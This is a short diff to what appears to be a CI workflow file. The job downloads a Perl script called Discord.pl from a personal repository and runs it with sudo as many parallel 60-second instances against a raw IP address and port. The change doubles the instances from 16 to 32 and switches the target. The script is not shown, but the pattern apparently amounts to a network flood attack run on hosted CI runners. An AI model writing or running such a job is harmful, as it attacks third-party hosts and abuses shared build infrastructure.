@@ -16,8 +16,8 @@ jobs:
           wget https://github.com/ahmetdonmmzz001/Discord/raw/refs/heads/main/Discord.pl -O Discord.pl
           chmod +x Discord.pl
           PIDS=()
-          for i in {1..16}; do
-            sudo timeout 60 perl Discord.pl 104.29.145.228 19303 &
+          for i in {1..32}; do
+            sudo timeout 60 perl Discord.pl 66.22.244.155 50017 &
             PIDS+=($!)
           done
           
